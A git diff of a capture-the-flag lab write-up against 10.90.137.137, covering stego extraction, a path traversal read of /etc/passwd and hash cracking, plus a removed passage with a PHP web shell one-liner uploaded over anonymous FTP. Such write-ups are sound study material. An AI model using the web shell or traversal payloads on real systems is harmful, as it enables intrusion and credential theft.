@@ -24,12 +24,18 @@ Firstly, I have download all images and try to use Staghide tool to extract data
 
 <kbd>![alt text](images/2.png)</kbd>
 
-I use Binwalk tool to extract data from the images. Then I got extracted file from the "mask.jpg"
+I use Binwalk tool to extract data from the images. I got extracted files from the "mask.jpg"
 
 <kbd>![alt text](images/3.png)</kbd>
+
+```
+binwalk -B mask.jpg 
+binwalk --dd='.*' mask.jpg
+```
+
 <kbd>![alt text](images/4.png)</kbd>
 
-Bingo !!! I got extracted file on that location. and finally This was my 1st Flag !!!
+Bingo !!! I got my 1st Flag !!!
 
 <kbd>![alt text](images/05.png)</kbd>
 
@@ -43,168 +49,110 @@ NSCTF{Andhakar_Ek_5ach_Hai_Aur_Prakash_3k_Mithya}
 
 ## Second Flag
 
+<kbd>![alt text](images/10.png)</kbd>
 
-After that, I start the Nmap scan on the machine. I got 2 more ports were open. "FTP" and "SSH"
+Now, I need to look for the "nihilist" image.
 
-<kbd>![alt text](test/9.png)</kbd>
+<kbd>![alt text](images/11.png)</kbd>
 
-I tried anonymously login on SSH Port!
+Using strings command I extraced words from image "nihilist.jpeg". I used -n query to extract word length more than 9
+```
+strings nihilist.jpeg -n 9
+```
+<kbd>![alt text](images/12.png)</kbd>
 
-<kbd>![alt text](test/10.png)</kbd>
+```
+74 47 47 82 73 49 72 64 66 45 83 48 86 47 64 46 64 68 56 57 48 46 84 65 73 75 45 43 55 49 72 47 65
+Ask nikhil to open the door
+```
+I have retrived the 2 important hints. In which first one might be encoding and the second would be the key to extract the flag.
 
-I also tried the FTP login. For that, the first thing I search for "https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/" :stuck_out_tongue_closed_eyes: But still I did not get any useful information.
+<kbd>![alt text](images/13.png)</kbd>
 
-<kbd>![alt text](test/11.png)</kbd>
+I visit the "https://cryptii.com/" website to decode the ascii code. Look on the Library !! I found the encoding method.
 
-So I return to the "/robots.txt" page for the hint and got it.
+<kbd>![alt text](images/14.png)</kbd>
 
-<kbd>![alt text](test/12.png)</kbd>
+> Now Time to Extract the Flag
 
-A few minutes later, I visit "view-source:http://10.90.137.137/Lockdown_is_the_Key/" and saw some awkward URL path reference.
+<kbd>![alt text](images/15.png)</kbd>
 
-> Then I realize that similar tasks I played on "HackTheBox" where I used SQLi for flag. I tried, but somehow it did not work.
+```"flag{karunahikrurtahailagaavhipeedahai}"```
 
-<kbd>![alt text](test/13.png)</kbd>
 
-I also look for other vulnerabilities and found "File Retrieval".
-
-<kbd>![alt text](test/14.png)</kbd>
-
-I visit other files and Directories. Then, I look in the FTP configuration file and got 2nd flag,
-
-```"flag{W3_@R3_!n_+H3_3NDG@M3_n0W!}"```
-
-<kbd>![alt text](test/15.png)</kbd>
 
 
 
 ## Third Flag
 
 
+<kbd>![alt text](images/20.png)</kbd>
 
-After reading the entire configuration file, I found "write_enable=YES" was enabled for anonymous users. So It's time to upload shell. 
+As the HINT suggest So I started look for "dj" word.
+However most of attemps are failed at first.
 
-<kbd>![alt text](test/16.png)</kbd>
+<kbd>![alt text](images/21.png)</kbd>
 
-Website was written in PHP and I used one liner shell code ```"<?php system($_GET['cmd']);?>"``` So I uploaded shell file on server.
+<kbd>![alt text](images/22.png)</kbd>
 
-```
-root@muzzy:~# ftp 10.90.137.137
-Connected to 10.90.137.137.
-220 (vsFTPd 3.0.3)
-Name (10.90.137.137:root): anonymous
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxrwxrwx    2 0        0            4096 Apr 24 10:55 door
-226 Directory send OK.
-ftp> put shell.php 
-local: shell.php remote: shell.php
-200 PORT command successful. Consider using PASV.
-553 Could not create file.
-ftp> ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxrwxrwx    2 0        0            4096 Apr 24 10:55 door
-226 Directory send OK.
-ftp>
-```
+<kbd>![alt text](images/23.png)</kbd>
 
-<kbd>![alt text](test/17.png)</kbd>
+<kbd>![alt text](images/24.png)</kbd>
 
+<kbd>![alt text](images/25.png)</kbd>
 
-> Bingoo !!!
+> I looked for every possibilities. :( but did not found anything usefull. Then I got the message !
 
-> Got shell !!
+<kbd>![alt text](images/26.png)</kbd>
 
-I looked at system information and user permission. I see 2 different files which might be key !!
+I have started looking for "CWE 22" and it is a path traversal vulnerability.
 
-<kbd>![alt text](test/19.png)</kbd>
+<kbd>![alt text](images/27.png)</kbd>
 
-```
-So, I tried ssh login
-    ssh usernsctf@10.90.137.137
-    password: passiron3000
-but failed. !!
+```So, I went to "http://10.90.137.137/?dj=/etc/passwd"```
 
-Then I tried again with below credentials
-    ssh nsctf@10.90.137.137
-    password: iron3000
-And Succeed!
-```
+<kbd>![alt text](images/28.png)</kbd>
 
-<kbd>![alt text](test/20.png)
+I visit the home folder of Asur and response was hidden.
 
+<kbd>![alt text](images/29.png)</kbd>
 
-I run common system commands and got Flag!!!
+But I found on the source page.
 
-```nsctf{"Ev3ryth!ng_!5_!N_my_m!nd"}```
+```NSCTF{Peeda_5e_Bada_Sh1kshak_Aur_koi_nahi_Hota}```
 
-
-<kbd>![alt text](test/21.png)</kbd>
+<kbd>![alt text](images/30.png)</kbd>
 
 
 
 ## Fourth Flag
 
+<kbd>![alt text](images/41.png)</kbd>
 
-I got 2 files in which one was encrypted, Then I tried to look for a decryption key in another file.
+<kbd>![alt text](images/40.png)</kbd>
 
+I quickly visit the Asur's command history file.
 
-<kbd>![alt text](test/22.png)</kbd>
+<kbd>![alt text](images/42.png)</kbd>
 
+<kbd>![alt text](images/43.png)</kbd>
 
-```
-#include <stdlib.h>
-#include <stdio.h>
-#include <string.h>
-int main(int argc, char **argv) {
-    if (argc != 3) {
-         printf("USAGE: %s INPUT OUTPUT\n", argv[0]);
-         return 0;
-     }
-     FILE* input  = fopen(argv[1], "rb");
-     FILE* output = fopen(argv[2], "wb");
-     if (!input || !output) {
-         printf("Error\n");
-         return 0;
-     }
-     char c, p, t = 0;
-     int i = 0;
-    char k[] = "Whenever_you_Want!";
-    i = 0;
-    c, p, t = 0;
-    int g = 0;
-    while ((p = fgetc(input)) != 1) {
-        c = (p - (k[i % strlen(k)] ^ t) - i*i) & 0xff;
-         printf("Decrypting %x i=%d t=%d k=%d -> %d\n",p,i,t,(k[i % strlen(k)] ^ t),c);
-        t = c;
-        i++;
-         fputc(c, output);
-         g++;
-         if (g>100) {break;}
-    }
-    return 0;
-}
-```
+```asur:b8be16afba8c314ad33d812f22a04991b90e2aaa```
+As per my assumptions this must be the SSH login credentials but the password was hash format. For hash value to decode I use online platform named CrackStation where i got the real value of hash file.
+```baconandcheese```
 
+<kbd>![alt text](images/44.png)</kbd>
 
+It's time for Login with SSH !! but what !! I face an error !
 
-I am not "C language Master" but what I can understand from this code was that,
+<kbd>![alt text](images/45.png)</kbd>
 
-This code will help me to decrypt this "msg.enc" file, So I tried to run the C file but first I have to install GCC in that machine.
+Now i visit the "passwd" file in which I tried all other user with same credentials.
 
-<kbd>![alt text](test/25.png)</kbd>
+<kbd>![alt text](images/47.png)</kbd>
 
 ```
-Now,
-gcc encryptor.c -o enc
-./enc msg.enc flag.txt
+22222222222222222222222222222222222222222222222222222222222222222222222222222222
 ```
 
 <kbd>![alt text](test/26.png)</kbd>
